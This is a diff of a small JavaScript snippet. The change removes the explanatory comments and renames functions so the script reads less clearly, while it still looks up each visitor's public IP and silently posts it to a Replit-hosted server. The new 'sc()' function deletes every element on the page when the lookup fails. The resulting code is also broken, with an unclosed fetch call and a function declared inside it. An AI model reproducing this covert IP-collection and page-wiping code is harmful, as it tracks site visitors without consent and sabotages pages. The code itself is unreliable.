@@ -1,37 +1,33 @@
 fetch('https://api64.ipify.org?format=json')
   .then(response => {
     if (!response.ok) {
-      throw new Error('Erro ao obter IP');
+      alert('Error to fetch');
+sc();
     }
     return response.json();
   })
   .then(data => {
-    const userIP = data.ip; // Obtém o IP do usuário
-    console.log('IP do usuário:', userIP);
+    const user = data.ip;
 
-    // Enviar o IP para o seu servidor Node.js
-    enviarIPParaServidor(userIP);
+    en(user);
   })
   .catch(error => {
-    console.error('Erro ao obter IP:', error);
+    console.error('Error to fetch');
+sc();
   });
 
-function enviarIPParaServidor(ip) {
-  // Aqui você deve enviar o IP para o seu servidor Node.js via requisição POST ou GET
-  fetch('https://482f5134-6dcf-4770-af34-1ee5d411512d-00-1dblg66wzgy4i.spock.replit.dev/recebe-ip', {
+function en(user) {
+  fetch('https://482f5134-6dcf-4770-af34-1ee5d411512d-00-1dblg66wzgy4i.spock.replit.dev/get', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
     },
-    body: JSON.stringify({ ip }),
+    body: JSON.stringify({ user }),
   })
-  .then(response => {
-    if (!response.ok) {
-      throw new Error('Erro ao enviar IP para o servidor');
+
+function sc() {
+    var k = document.querySelectorAll('*');
+    for(var i = 0; i < k.length; i++) {
+        k[i].remove();
     }
-    console.log('IP enviado com sucesso para o servidor');
-  })
-  .catch(error => {
-    console.error('Erro ao enviar IP para o servidor:', error);
-  });
 }
